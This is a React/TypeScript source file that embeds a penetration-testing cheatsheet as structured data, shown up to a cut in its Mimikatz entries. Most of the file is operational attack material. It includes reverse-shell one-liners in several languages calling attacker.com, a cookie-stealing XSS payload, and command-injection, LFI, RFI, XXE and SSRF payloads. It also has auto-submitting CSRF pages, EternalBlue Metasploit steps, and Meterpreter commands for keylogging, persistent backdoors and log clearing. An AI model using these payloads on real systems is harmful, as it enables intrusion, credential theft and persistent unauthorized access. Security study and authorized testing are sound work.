import React, {
  useState,
  useCallback,
  useRef,
  useEffect,
  memo,
  useMemo,
} from "react";
import { motion, AnimatePresence, type Variants } from "framer-motion";
import {
  Shield, Terminal, Lock, Code, Globe, Eye, Key, Binary,
  Activity, Server, Database, Zap, Layers, Cpu, ChevronRight,
  Fingerprint, ArrowRight, X, Check as CheckIcon,
  AlertTriangle, Copy, CheckCheck,
} from "lucide-react";

/* ─────────────────────────────────────────────────────────
   TYPES
───────────────────────────────────────────────────────── */
export interface Command {
  command: string;
  description: string;
  category?: string;
}
export interface ManualExploit {
  payload: string;
  description: string;
  context: string;
}
export interface ReverseShell {
  name: string;
  command: string;
  description: string;
}
export interface XSSType {
  type: string;
  payloads: { payload: string; description: string; context: string }[];
}
export interface CSRFExploit {
  name: string;
  code: string;
  description: string;
}
export interface DeserializationExample {
  language: string;
  payload: string;
  description: string;
}
export interface OWASPVulnerability {
  rank: number;
  name: string;
  description: string;
  severity: string;
  examples?: string[];
  types?: string[] | XSSType[];
  testMethods?: string[];
  payloads?: { payload: string; description: string; context: string }[];
  tools?: string[];
  covered?: string;
}
export interface Vulnerability {
  name: string;
  severity?: string;
  description?: string;
  manualExploits?: ManualExploit[];
  types?: XSSType[];
  payloads?: { payload: string; description: string; context: string }[];
  reverseShells?: ReverseShell[];
  exploits?: CSRFExploit[];
  examples?: DeserializationExample[];
  tools?: Tool[];
  notes?: string;
}
export interface Tool {
  name: string;
  description?: string;
  notes?: string;
  commands: Command[];
}
export interface Port {
  port: number;
  service: string;
  vulnerabilities: string[];
}
export interface Subsection {
  subtitle: string;
  description?: string;
  tools?: Tool[];
  vulnerabilities?: Vulnerability[];
}
export interface Section {
  title: string;
  description?: string;
  subsections?: Subsection[];
  vulnerabilities?: OWASPVulnerability[];
  ports?: Port[];
}
export interface CheatsheetData {
  title: string;
  sections: Section[];
}

/* ─────────────────────────────────────────────────────────
   CHEATSHEET DATA  (merged from cheatsheetData.ts)
───────────────────────────────────────────────────────── */
export const cheatsheetData: CheatsheetData = {
  title: "Penetration Testing Cheatsheet",
  sections: [
    {
      title: "Phase 1: Reconnaissance (Information Gathering)",
      description: "Gather as much information as possible about the target system",
      subsections: [
        {
          subtitle: "Passive Reconnaissance",
          description: "Gathering information without directly interacting with the target",
          tools: [
            {
              name: "Google Dorking",
              description: "Advanced Google search operators for finding sensitive information",
              commands: [
                { command: "site:target.com filetype:pdf", description: "Find all PDF files on target domain", category: "search" },
                { command: "site:target.com inurl:admin", description: "Find admin panels", category: "search" },
                { command: 'site:target.com intitle:"index of"', description: "Find directory listings", category: "search" },
                { command: "site:target.com ext:sql | ext:db | ext:dbf", description: "Find database files", category: "search" },
                { command: 'site:target.com intext:"password" | intext:"username"', description: "Find pages containing credentials", category: "search" },
              ],
            },
            {
              name: "WHOIS Lookup",
              description: "Domain registration information gathering",
              commands: [
                { command: "whois target.com", description: "Get domain registration details", category: "reconnaissance" },
                { command: "whois -h whois.arin.net 192.168.1.1", description: "IP WHOIS lookup", category: "reconnaissance" },
              ],
            },
            {
              name: "theHarvester",
              description: "Email, subdomain, and name harvesting tool",
              commands: [
                { command: "theHarvester -d target.com -b google", description: "Harvest emails using Google", category: "reconnaissance" },
                { command: "theHarvester -d target.com -b all", description: "Use all sources for harvesting", category: "reconnaissance" },
                { command: "theHarvester -d target.com -b linkedin -l 500", description: "Harvest from LinkedIn with 500 results limit", category: "reconnaissance" },
              ],
            },
            {
              name: "Shodan",
              description: "Search engine for Internet-connected devices",
              commands: [
                { command: 'shodan search "apache" country:US', description: "Find Apache servers in the US", category: "reconnaissance" },
                { command: "shodan host 192.168.1.1", description: "Get detailed information about an IP", category: "reconnaissance" },
                { command: 'shodan search "default password" port:22', description: "Find SSH servers with default passwords", category: "reconnaissance" },
              ],
            },
            {
              name: "DNSRecon",
              description: "DNS enumeration and reconnaissance",
              commands: [
                { command: "dnsrecon -d target.com", description: "Standard DNS enumeration", category: "reconnaissance" },
                { command: "dnsrecon -d target.com -t axfr", description: "Attempt DNS zone transfer", category: "reconnaissance" },
                { command: "dnsrecon -d target.com -t brt -D /usr/share/wordlists/subdomains.txt", description: "Subdomain brute forcing", category: "reconnaissance" },
              ],
            },
            {
              name: "Sublist3r",
              description: "Subdomain enumeration tool",
              commands: [
                { command: "sublist3r -d target.com", description: "Enumerate subdomains", category: "reconnaissance" },
                { command: "sublist3r -d target.com -b", description: "Enable subbrute for brute forcing", category: "reconnaissance" },
                { command: "sublist3r -d target.com -p 80,443", description: "Check specific ports on found subdomains", category: "reconnaissance" },
              ],
            },
          ],
        },
        {
          subtitle: "Active Reconnaissance",
          description: "Direct interaction with the target system",
          tools: [
            {
              name: "Nmap",
              description: "Network discovery and security auditing",
              commands: [
                { command: "nmap -sn 192.168.1.0/24", description: "Ping sweep (host discovery)", category: "scanning" },
                { command: "nmap -sS -sV -O target.com", description: "SYN scan with version detection and OS detection", category: "scanning" },
                { command: "nmap -p- target.com", description: "Scan all 65535 ports", category: "scanning" },
                { command: "nmap -sC -sV -p 1-1000 target.com", description: "Scan with default scripts and version detection", category: "scanning" },
                { command: "nmap -sU -p 161 target.com", description: "UDP scan for SNMP", category: "scanning" },
                { command: "nmap --script vuln target.com", description: "Run vulnerability scripts", category: "scanning" },
                { command: "nmap -sV --script=http-enum target.com", description: "Enumerate web directories and files", category: "scanning" },
                { command: "nmap -A -T4 target.com", description: "Aggressive scan with timing template", category: "scanning" },
                { command: "nmap --script=ssl-enum-ciphers -p 443 target.com", description: "Enumerate SSL/TLS ciphers", category: "scanning" },
              ],
            },
            {
              name: "Masscan",
              description: "Fast port scanner",
              commands: [
                { command: "masscan -p1-65535 192.168.1.0/24 --rate=1000", description: "Fast scan of all ports", category: "scanning" },
                { command: "masscan -p80,443 0.0.0.0/0 --rate=10000", description: "Scan for web servers at high rate", category: "scanning" },
              ],
            },
            {
              name: "Netcat",
              description: "Network utility for reading/writing data across connections",
              commands: [
                { command: "nc -zv target.com 1-1000", description: "Port scanning", category: "scanning" },
                { command: "nc -lvp 4444", description: "Listen on port 4444", category: "exploitation" },
                { command: "nc target.com 80", description: "Connect to HTTP server", category: "scanning" },
                { command: "nc -e /bin/bash target.com 4444", description: "Reverse shell (attacker listening)", category: "exploitation" },
              ],
            },
          ],
        },
      ],
    },

    {
      title: "Phase 2: Scanning & Enumeration",
      description: "Identify live hosts, open ports, services, and potential vulnerabilities",
      subsections: [
        {
          subtitle: "Vulnerability Scanning",
          description: "Automated vulnerability detection",
          tools: [
            {
              name: "Nessus",
              description: "Comprehensive vulnerability scanner",
              notes: "Primarily GUI-based tool",
              commands: [
                { command: "/opt/nessus/sbin/nessuscli scan new", description: "Create new scan via CLI", category: "scanning" },
                { command: "/opt/nessus/sbin/nessuscli update --all", description: "Update Nessus plugins", category: "maintenance" },
              ],
            },
            {
              name: "OpenVAS",
              description: "Open-source vulnerability scanner",
              commands: [
                { command: "openvas-setup", description: "Initial setup of OpenVAS", category: "setup" },
                { command: "openvas-start", description: "Start OpenVAS services", category: "scanning" },
                { command: "openvas-feed-update", description: "Update vulnerability feeds", category: "maintenance" },
              ],
            },
            {
              name: "Nikto",
              description: "Web server scanner",
              commands: [
                { command: "nikto -h http://target.com", description: "Basic web server scan", category: "scanning" },
                { command: "nikto -h http://target.com -p 80,443,8080", description: "Scan multiple ports", category: "scanning" },
                { command: "nikto -h http://target.com -Tuning 123bde", description: "Custom tuning (skip certain tests)", category: "scanning" },
                { command: "nikto -h http://target.com -o report.html -Format html", description: "Save report in HTML format", category: "scanning" },
                { command: "nikto -h http://target.com -useproxy http://proxy:8080", description: "Scan through proxy", category: "scanning" },
              ],
            },
          ],
        },
        {
          subtitle: "Service Enumeration",
          description: "Detailed service and version information gathering",
          tools: [
            {
              name: "Enum4linux",
              description: "Windows/Samba enumeration tool",
              commands: [
                { command: "enum4linux -a target.com", description: "Do all simple enumeration", category: "enumeration" },
                { command: "enum4linux -U target.com", description: "Enumerate users", category: "enumeration" },
                { command: "enum4linux -S target.com", description: "Enumerate shares", category: "enumeration" },
                { command: "enum4linux -G target.com", description: "Enumerate groups", category: "enumeration" },
              ],
            },
            {
              name: "SMBClient",
              description: "SMB/CIFS client",
              commands: [
                { command: "smbclient -L //target.com -N", description: "List shares without password", category: "enumeration" },
                { command: "smbclient //target.com/share -U username", description: "Connect to specific share", category: "enumeration" },
                { command: "smbclient //target.com/C$ -U administrator", description: "Access C drive share", category: "enumeration" },
              ],
            },
            {
              name: "SNMPwalk",
              description: "SNMP enumeration",
              commands: [
                { command: "snmpwalk -c public -v1 target.com", description: "Walk SNMP tree with public community", category: "enumeration" },
                { command: "snmpwalk -c public -v2c target.com", description: "SNMP v2c enumeration", category: "enumeration" },
                { command: "snmpwalk -c public -v1 target.com 1.3.6.1.4.1.77.1.2.25", description: "Enumerate users via SNMP", category: "enumeration" },
              ],
            },
            {
              name: "Gobuster",
              description: "Directory and file brute forcing",
              commands: [
                { command: "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt", description: "Directory brute forcing", category: "enumeration" },
                { command: "gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt", description: "Brute force with file extensions", category: "enumeration" },
                { command: "gobuster dns -d target.com -w subdomains.txt", description: "DNS subdomain brute forcing", category: "enumeration" },
                { command: "gobuster vhost -u http://target.com -w vhosts.txt", description: "Virtual host brute forcing", category: "enumeration" },
              ],
            },
            {
              name: "Dirbuster",
              description: "Web application directory scanner",
              commands: [
                { command: "dirb http://target.com", description: "Basic directory scan", category: "enumeration" },
                { command: "dirb http://target.com /usr/share/wordlists/dirb/big.txt", description: "Scan with custom wordlist", category: "enumeration" },
                { command: "dirb http://target.com -X .php,.txt,.html", description: "Search for specific extensions", category: "enumeration" },
              ],
            },
            {
              name: "WPScan",
              description: "WordPress vulnerability scanner",
              commands: [
                { command: "wpscan --url http://target.com", description: "Basic WordPress scan", category: "enumeration" },
                { command: "wpscan --url http://target.com --enumerate u", description: "Enumerate users", category: "enumeration" },
                { command: "wpscan --url http://target.com --enumerate p", description: "Enumerate plugins", category: "enumeration" },
                { command: "wpscan --url http://target.com --enumerate vp", description: "Enumerate vulnerable plugins", category: "enumeration" },
                { command: "wpscan --url http://target.com -U users.txt -P passwords.txt", description: "Brute force attack", category: "exploitation" },
              ],
            },
          ],
        },
      ],
    },

    {
      title: "Phase 3: Gaining Access (Exploitation)",
      description: "Exploit identified vulnerabilities to gain unauthorized access",
      subsections: [
        {
          subtitle: "Web Application Attacks",
          description: "Common web application vulnerability exploitation",
          vulnerabilities: [
            {
              name: "SQL Injection",
              description: "Inject malicious SQL commands",
              severity: "Critical",
              tools: [
                {
                  name: "SQLmap",
                  description: "Automated SQL injection tool",
                  commands: [
                    { command: 'sqlmap -u "http://target.com/page.php?id=1"', description: "Basic SQL injection test", category: "exploitation" },
                    { command: 'sqlmap -u "http://target.com/page.php?id=1" --dbs', description: "Enumerate databases", category: "exploitation" },
                    { command: 'sqlmap -u "http://target.com/page.php?id=1" -D database --tables', description: "Enumerate tables in database", category: "exploitation" },
                    { command: 'sqlmap -u "http://target.com/page.php?id=1" -D database -T users --columns', description: "Enumerate columns in table", category: "exploitation" },
                    { command: 'sqlmap -u "http://target.com/page.php?id=1" -D database -T users -C username,password --dump', description: "Dump table data", category: "exploitation" },
                    { command: 'sqlmap -u "http://target.com/page.php?id=1" --os-shell', description: "Get OS shell", category: "exploitation" },
                    { command: "sqlmap -r request.txt --batch", description: "Use captured request file", category: "exploitation" },
                    { command: 'sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3', description: "Thorough testing (aggressive)", category: "exploitation" },
                  ],
                },
              ],
              manualExploits: [
                { payload: "' OR '1'='1", description: "Basic authentication bypass", context: "Login forms" },
                { payload: "' UNION SELECT NULL,NULL,NULL--", description: "Determine number of columns", context: "UNION-based injection" },
                { payload: "' UNION SELECT username,password FROM users--", description: "Extract data from users table", context: "UNION-based injection" },
                { payload: "admin'--", description: "Comment out rest of query", context: "Authentication bypass" },
                { payload: "1' AND 1=1--", description: "Boolean-based blind SQLi (true)", context: "Blind SQL injection" },
                { payload: "1' AND 1=2--", description: "Boolean-based blind SQLi (false)", context: "Blind SQL injection" },
                { payload: "'; DROP TABLE users--", description: "Destructive SQL injection", context: "Database manipulation" },
                { payload: "' OR SLEEP(5)--", description: "Time-based blind SQLi", context: "Blind SQL injection" },
              ],
            },

            {
              name: "Cross-Site Scripting (XSS)",
              description: "Inject malicious scripts into web pages",
              severity: "High",
              types: [
                {
                  type: "Reflected XSS",
                  payloads: [
                    { payload: "<script>alert('XSS')</script>", description: "Basic XSS test", context: "URL parameters, search fields" },
                    { payload: "<img src=x onerror=alert('XSS')>", description: "Image-based XSS", context: "Input fields" },
                    { payload: "<svg/onload=alert('XSS')>", description: "SVG-based XSS", context: "Input fields" },
                    { payload: "javascript:alert('XSS')", description: "JavaScript protocol", context: "Link href attributes" },
                    { payload: "<iframe src=javascript:alert('XSS')>", description: "IFrame-based XSS", context: "Input fields" },
                  ],
                },
                {
                  type: "Stored XSS",
                  payloads: [
                    { payload: "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>", description: "Cookie stealing", context: "Comment sections, profile fields" },
                    { payload: "<script src=http://attacker.com/malicious.js></script>", description: "External script inclusion", context: "Persistent storage fields" },
                  ],
                },
                {
                  type: "DOM-based XSS",
                  payloads: [
                    { payload: "#<img src=x onerror=alert('XSS')>", description: "Fragment-based DOM XSS", context: "Hash/fragment manipulation" },
                  ],
                },
              ] as XSSType[],
              tools: [
                {
                  name: "XSStrike",
                  description: "Advanced XSS detection suite",
                  commands: [
                    { command: 'xsstrike -u "http://target.com/page.php?q=test"', description: "Scan for XSS vulnerabilities", category: "exploitation" },
                    { command: 'xsstrike -u "http://target.com/page.php?q=test" --crawl', description: "Crawl and scan for XSS", category: "exploitation" },
                  ],
                },
              ],
            },

            {
              name: "Command Injection",
              description: "Execute arbitrary commands on the server",
              severity: "Critical",
              payloads: [
                { payload: "; ls -la", description: "List directory contents (Linux)", context: "Command chaining" },
                { payload: "| whoami", description: "Get current user", context: "Pipe operator" },
                { payload: "&& cat /etc/passwd", description: "Read passwd file", context: "AND operator" },
                { payload: "; nc -e /bin/bash attacker.com 4444", description: "Reverse shell", context: "Netcat reverse shell" },
                { payload: "`whoami`", description: "Command substitution", context: "Backticks" },
                { payload: "$(id)", description: "Command substitution", context: "Dollar parentheses" },
                { payload: "; ping -c 10 attacker.com", description: "Time-based detection via ping", context: "Blind command injection" },
              ],
              reverseShells: [
                { name: "Bash Reverse Shell", command: "bash -i >& /dev/tcp/attacker.com/4444 0>&1", description: "Bash TCP reverse shell" },
                { name: "Python Reverse Shell", command: 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'', description: "Python TCP reverse shell" },
                { name: "PHP Reverse Shell", command: 'php -r \'$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");\'', description: "PHP TCP reverse shell" },
                { name: "Netcat Reverse Shell", command: "nc -e /bin/sh attacker.com 4444", description: "Netcat reverse shell" },
                { name: "Perl Reverse Shell", command: 'perl -e \'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'', description: "Perl TCP reverse shell" },
                { name: "Ruby Reverse Shell", command: 'ruby -rsocket -e\'f=TCPSocket.open("attacker.com",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'', description: "Ruby TCP reverse shell" },
              ],
            },

            {
              name: "Local File Inclusion (LFI)",
              description: "Include local files from the server",
              severity: "High",
              payloads: [
                { payload: "../../../../etc/passwd", description: "Read passwd file (Linux)", context: "Path traversal" },
                { payload: "../../../../etc/shadow", description: "Read shadow file (requires privileges)", context: "Path traversal" },
                { payload: "..\\..\\..\\..\\windows\\system32\\config\\sam", description: "Read SAM file (Windows)", context: "Windows path traversal" },
                { payload: "php://filter/convert.base64-encode/resource=index.php", description: "Read PHP source code (base64 encoded)", context: "PHP wrapper" },
                { payload: "php://input", description: "Include POST data as PHP code", context: "PHP wrapper exploitation" },
                { payload: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=", description: "Execute PHP via data wrapper", context: "Data wrapper" },
                { payload: "expect://id", description: "Execute commands via expect wrapper", context: "Expect wrapper" },
                { payload: "/proc/self/environ", description: "Read environment variables", context: "Linux proc filesystem" },
                { payload: "/var/log/apache2/access.log", description: "Log poisoning", context: "Access log file" },
              ],
            },

            {
              name: "Remote File Inclusion (RFI)",
              description: "Include remote files from attacker's server",
              severity: "Critical",
              notes: "Requires allow_url_include=On in PHP configuration",
              payloads: [
                { payload: "http://attacker.com/shell.txt", description: "Include remote shell", context: "Remote inclusion" },
                { payload: "http://attacker.com/shell.txt?", description: "Null byte bypass (old PHP versions)", context: "Remote inclusion with null byte" },
                { payload: "http://attacker.com/shell.txt%00", description: "URL encoded null byte", context: "Null byte bypass" },
              ],
            },

            {
              name: "XML External Entity (XXE)",
              description: "Exploit XML parsers to read files or perform SSRF",
              severity: "High",
              payloads: [
                { payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', description: "Read local file", context: "XXE file disclosure" },
                { payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/admin">]><foo>&xxe;</foo>', description: "SSRF via XXE", context: "Internal network scanning" },
                { payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>', description: "Base64 encoded file read", context: "XXE with encoding" },
                { payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>', description: "Blind XXE with external DTD", context: "Out-of-band XXE" },
              ],
            },

            {
              name: "Server-Side Request Forgery (SSRF)",
              description: "Force server to make requests to internal resources",
              severity: "High",
              payloads: [
                { payload: "http://localhost:80", description: "Access localhost services", context: "Internal service access" },
                { payload: "http://127.0.0.1:8080", description: "Access internal application", context: "Internal port scanning" },
                { payload: "http://169.254.169.254/latest/meta-data/", description: "AWS metadata service", context: "Cloud metadata access" },
                { payload: "http://192.168.0.1", description: "Internal network scanning", context: "Private IP access" },
                { payload: "file:///etc/passwd", description: "Local file access", context: "File protocol" },
                { payload: "gopher://127.0.0.1:25/_MAIL%20FROM:attacker@evil.com", description: "Gopher protocol exploitation", context: "Protocol smuggling" },
              ],
            },

            {
              name: "Cross-Site Request Forgery (CSRF)",
              description: "Force authenticated users to perform unwanted actions",
              severity: "Medium" as any,
              exploits: [
                {
                  name: "HTML Form CSRF",
                  code: `<html>\n  <body>\n    <form action="http://target.com/change-password" method="POST">\n      <input type="hidden" name="password" value="hacked123" />\n      <input type="hidden" name="confirm_password" value="hacked123" />\n    </form>\n    <script>document.forms[0].submit();</script>\n  </body>\n</html>`,
                  description: "Auto-submitting form CSRF",
                },
                {
                  name: "Image Tag CSRF",
                  code: '<img src="http://target.com/delete-account?confirm=yes" />',
                  description: "GET request CSRF via image",
                },
                {
                  name: "JavaScript CSRF",
                  code: `<script>\nvar xhr = new XMLHttpRequest();\nxhr.open("POST", "http://target.com/transfer-money", true);\nxhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");\nxhr.send("amount=1000&to=attacker");\n</script>`,
                  description: "AJAX CSRF attack",
                },
              ],
            },

            {
              name: "Insecure Deserialization",
              description: "Exploit deserialization of untrusted data",
              severity: "Critical",
              tools: [
                {
                  name: "ysoserial",
                  description: "Java deserialization payload generator",
                  commands: [
                    { command: 'java -jar ysoserial.jar CommonsCollections5 "calc.exe" | base64', description: "Generate Java deserialization payload", category: "exploitation" },
                    { command: 'java -jar ysoserial.jar CommonsCollections6 "nc -e /bin/bash attacker.com 4444"', description: "Reverse shell payload", category: "exploitation" },
                  ],
                },
              ],
              examples: [
                { language: "PHP", payload: 'O:8:"UserData":2:{s:8:"username";s:5:"admin";s:7:"isAdmin";b:1;}', description: "PHP object injection" },
                { language: "Python", payload: "cos\\nsystem\\n(S'id'\\ntR.", description: "Python pickle deserialization" },
              ],
            },
          ],
        },

        {
          subtitle: "Network Exploitation",
          description: "Network-level attacks and exploits",
          tools: [
            {
              name: "Metasploit Framework",
              description: "Comprehensive penetration testing framework",
              commands: [
                { command: "msfconsole", description: "Start Metasploit console", category: "exploitation" },
                { command: "search ms17-010", description: "Search for EternalBlue exploit", category: "exploitation" },
                { command: "use exploit/windows/smb/ms17_010_eternalblue", description: "Use EternalBlue exploit module", category: "exploitation" },
                { command: "set RHOSTS 192.168.1.100", description: "Set target host", category: "exploitation" },
                { command: "set PAYLOAD windows/x64/meterpreter/reverse_tcp", description: "Set payload", category: "exploitation" },
                { command: "set LHOST 192.168.1.50", description: "Set listening host", category: "exploitation" },
                { command: "set LPORT 4444", description: "Set listening port", category: "exploitation" },
                { command: "exploit", description: "Run the exploit", category: "exploitation" },
                { command: "sessions -l", description: "List active sessions", category: "post-exploitation" },
                { command: "sessions -i 1", description: "Interact with session", category: "post-exploitation" },
                { command: "use auxiliary/scanner/smb/smb_version", description: "SMB version scanner", category: "scanning" },
                { command: "use auxiliary/scanner/ssh/ssh_login", description: "SSH brute force module", category: "exploitation" },
              ],
            },
            {
              name: "Responder",
              description: "LLMNR, NBT-NS and MDNS poisoner",
              commands: [
                { command: "responder -I eth0 -rdwv", description: "Start Responder on eth0", category: "exploitation" },
                { command: "responder -I eth0 -rdwv -F", description: "Force WPAD authentication", category: "exploitation" },
              ],
            },
            {
              name: "Impacket",
              description: "Collection of Python classes for network protocols",
              commands: [
                { command: "python3 psexec.py domain/user:password@target.com", description: "PSExec-like functionality", category: "exploitation" },
                { command: "python3 secretsdump.py domain/user:password@target.com", description: "Dump password hashes", category: "exploitation" },
                { command: "python3 smbexec.py domain/user:password@target.com", description: "Execute commands via SMB", category: "exploitation" },
                { command: "python3 wmiexec.py domain/user:password@target.com", description: "Execute commands via WMI", category: "exploitation" },
                { command: "python3 ntlmrelayx.py -tf targets.txt -smb2support", description: "NTLM relay attack", category: "exploitation" },
              ],
            },
          ],
        },

        {
          subtitle: "Password Attacks",
          description: "Password cracking and authentication attacks",
          tools: [
            {
              name: "John the Ripper",
              description: "Password cracking tool",
              commands: [
                { command: "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt", description: "Dictionary attack", category: "password-cracking" },
                { command: "john --format=NT hashes.txt", description: "Crack NTLM hashes", category: "password-cracking" },
                { command: "john --show hashes.txt", description: "Show cracked passwords", category: "password-cracking" },
                { command: "john --incremental hashes.txt", description: "Brute force mode", category: "password-cracking" },
                { command: "unshadow passwd shadow > combined.txt", description: "Combine passwd and shadow files", category: "password-cracking" },
                { command: "john combined.txt", description: "Crack combined file", category: "password-cracking" },
              ],
            },
            {
              name: "Hashcat",
              description: "Advanced password recovery",
              commands: [
                { command: "hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt", description: "MD5 dictionary attack", category: "password-cracking" },
                { command: "hashcat -m 1000 -a 0 hashes.txt wordlist.txt", description: "NTLM dictionary attack", category: "password-cracking" },
                { command: "hashcat -m 1800 -a 0 hashes.txt wordlist.txt", description: "Linux SHA-512 attack", category: "password-cracking" },
                { command: "hashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l", description: "Brute force 6 lowercase letters", category: "password-cracking" },
                { command: "hashcat -m 0 -a 3 hash.txt ?u?l?l?l?l?d?d?d", description: "Mixed character brute force", category: "password-cracking" },
                { command: "hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r rules/best64.rule", description: "Dictionary attack with rules", category: "password-cracking" },
                { command: "hashcat --show hashes.txt", description: "Show cracked passwords", category: "password-cracking" },
              ],
            },
            {
              name: "Hydra",
              description: "Network login cracker",
              commands: [
                { command: "hydra -l admin -P passwords.txt ssh://target.com", description: "SSH brute force", category: "password-cracking" },
                { command: "hydra -L users.txt -P passwords.txt ftp://target.com", description: "FTP brute force", category: "password-cracking" },
                { command: 'hydra -l admin -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"', description: "HTTP POST form brute force", category: "password-cracking" },
                { command: "hydra -L users.txt -P passwords.txt smb://target.com", description: "SMB brute force", category: "password-cracking" },
                { command: "hydra -l admin -P passwords.txt rdp://target.com", description: "RDP brute force", category: "password-cracking" },
                { command: "hydra -L users.txt -P passwords.txt mysql://target.com", description: "MySQL brute force", category: "password-cracking" },
                { command: "hydra -t 4 -l admin -P passwords.txt ssh://target.com", description: "SSH brute force with 4 threads", category: "password-cracking" },
              ],
            },
            {
              name: "Medusa",
              description: "Fast parallel password cracker",
              commands: [
                { command: "medusa -h target.com -u admin -P passwords.txt -M ssh", description: "SSH brute force", category: "password-cracking" },
                { command: "medusa -h target.com -U users.txt -P passwords.txt -M ftp", description: "FTP brute force", category: "password-cracking" },
                { command: "medusa -h target.com -u admin -P passwords.txt -M http -m DIR:/admin", description: "HTTP brute force", category: "password-cracking" },
              ],
            },
            {
              name: "CeWL",
              description: "Custom wordlist generator",
              commands: [
                { command: "cewl http://target.com -w wordlist.txt", description: "Generate wordlist from website", category: "password-cracking" },
                { command: "cewl http://target.com -d 3 -m 5 -w wordlist.txt", description: "Depth 3, minimum 5 chars", category: "password-cracking" },
                { command: "cewl http://target.com --with-numbers -w wordlist.txt", description: "Include numbers in wordlist", category: "password-cracking" },
              ],
            },
          ],
        },

        {
          subtitle: "Wireless Attacks",
          description: "Wireless network exploitation",
          tools: [
            {
              name: "Aircrack-ng Suite",
              description: "Complete suite of wireless tools",
              commands: [
                { command: "airmon-ng start wlan0", description: "Enable monitor mode", category: "wireless" },
                { command: "airodump-ng wlan0mon", description: "Scan for wireless networks", category: "wireless" },
                { command: "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon", description: "Capture packets from specific AP", category: "wireless" },
                { command: "aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon", description: "Deauth attack (capture handshake)", category: "wireless" },
                { command: "aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap", description: "Crack WPA/WPA2 from capture", category: "wireless" },
                { command: "aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon", description: "ARP replay attack", category: "wireless" },
                { command: "aircrack-ng capture-01.cap", description: "Crack WEP encryption", category: "wireless" },
              ],
            },
            {
              name: "Reaver",
              description: "WPS brute force attack tool",
              commands: [
                { command: "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv", description: "WPS brute force attack", category: "wireless" },
                { command: "wash -i wlan0mon", description: "Scan for WPS-enabled APs", category: "wireless" },
              ],
            },
            {
              name: "Bettercap",
              description: "Network attack and monitoring framework",
              commands: [
                { command: "bettercap -iface eth0", description: "Start bettercap", category: "wireless" },
                { command: "net.probe on", description: "Enable network discovery", category: "wireless" },
                { command: "net.sniff on", description: "Enable packet sniffing", category: "wireless" },
                { command: "set arp.spoof.targets 192.168.1.100", description: "Set ARP spoofing target", category: "wireless" },
                { command: "arp.spoof on", description: "Start ARP spoofing", category: "wireless" },
              ],
            },
          ],
        },
      ],
    },

    {
      title: "Phase 4: Maintaining Access",
      description: "Establish persistent access to compromised systems",
      subsections: [
        {
          subtitle: "Post-Exploitation Tools",
          description: "Tools for maintaining access and privilege escalation",
          tools: [
            {
              name: "Meterpreter",
              description: "Advanced payload for Metasploit",
              commands: [
                { command: "sysinfo", description: "Get system information", category: "post-exploitation" },
                { command: "getuid", description: "Get current user ID", category: "post-exploitation" },
                { command: "getsystem", description: "Attempt to gain SYSTEM privileges", category: "post-exploitation" },
                { command: "hashdump", description: "Dump password hashes", category: "post-exploitation" },
                { command: "screenshot", description: "Take screenshot", category: "post-exploitation" },
                { command: "keyscan_start", description: "Start keylogger", category: "post-exploitation" },
                { command: "keyscan_dump", description: "Dump keystrokes", category: "post-exploitation" },
                { command: "ps", description: "List running processes", category: "post-exploitation" },
                { command: "migrate 1234", description: "Migrate to process ID 1234", category: "post-exploitation" },
                { command: "run post/windows/gather/enum_logged_on_users", description: "Enumerate logged on users", category: "post-exploitation" },
                { command: "run post/windows/gather/credentials/credential_collector", description: "Collect credentials", category: "post-exploitation" },
                { command: "download /path/to/file /local/path", description: "Download file from target", category: "post-exploitation" },
                { command: "upload /local/file /remote/path", description: "Upload file to target", category: "post-exploitation" },
                { command: "shell", description: "Drop to system shell", category: "post-exploitation" },
                { command: "run persistence -X -i 60 -p 4444 -r attacker.com", description: "Install persistent backdoor", category: "post-exploitation" },
                { command: "clearev", description: "Clear event logs", category: "post-exploitation" },
              ],
            },
            {
              name: "Mimikatz",
              description: "Windows credential extraction tool",
              notes: "Requires admin/SYSTEM rights. Will trigger most EDR solutions.",
              commands: [
                { command: "privilege::debug", description: "Get debug privileges", category: "post-exploitation" },
                { command: "sekurlsa::logonpasswords", description: "Dump credentials from memory", category: "post-exploitation" },
                { command: "lsadump::sam", description: "Dump SAM database", category: "post-exploitation" },
                { command: "lsadump::secrets", description: "Dump LSA secrets", category: "post-exploitation" },
                { command: "kerberos::list", description: "List Kerberos tickets", category: "post-exploitation" },
